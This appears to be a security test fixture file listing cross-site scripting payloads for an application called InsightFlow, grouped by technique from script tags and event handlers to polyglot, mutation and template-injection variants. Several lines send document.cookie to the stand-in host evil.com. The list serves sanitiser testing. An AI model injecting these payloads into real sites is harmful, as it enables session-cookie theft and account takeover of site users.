# XSS Payloads - InsightFlow Security Test Fixtures
# Format: one payload per line, # for comments

# Basic script injection
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
<script>new Image().src='http://evil.com/steal?'+document.cookie</script>

# Event handlers
<img src=x onerror=alert(1)>
<img src=x onerror=document.location='http://evil.com'>
<img src=x onerror=fetch('http://evil.com/'+document.cookie)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<svg onload=alert(1)>
<marquee onstart=alert(1)>
<div onmouseover=alert(1)>Hover me</div>

# JavaScript pseudo-protocol
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

# SVG-based XSS
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml,<script>alert(1)</script>">

# Attribute-based
" onfocus=alert(1) autofocus
" onmouseover=alert(1)
' onfocus=alert(1) autofocus
' - alert(1) - '
" autofocus onfocus=alert(1) x="

# Encoded variants
&#60;script&#62;alert(1)&#60;/script&#62;
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
\u003cscript\u003ealert(1)\u003c/script\u003e

# CSS injection
<div style="width:expression(alert(1))">
<style>body{background-image:url('javascript:alert(1)')}</style>
<div style="background:url('javascript:alert(1)')">

# DOM-based XSS
#"><img src=x onerror=alert(1)>
#<img src=x onerror=alert(1)>
</script><script>alert(1)</script>
<</script><script>alert(1)</script>

# Angular / template injection
{{constructor.constructor('alert(1)')()}}
{{7*7}}
{$on.constructor('alert(1)')()}

# Polyglot XSS
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e

# Mutation XSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<select><option><style></select><script>alert(1)</script>

# XSS via headers
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
Cookie: <script>alert(1)</script>

# XSS in JSON
{"name": "<script>alert(1)</script>"}
{"url": "javascript:alert(1)"}

# Self-XSS variants
'"><img src=x onerror=alert(1)>
""><img src=x onerror=alert(1)>
'';!--"<XSS>=&{()}
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
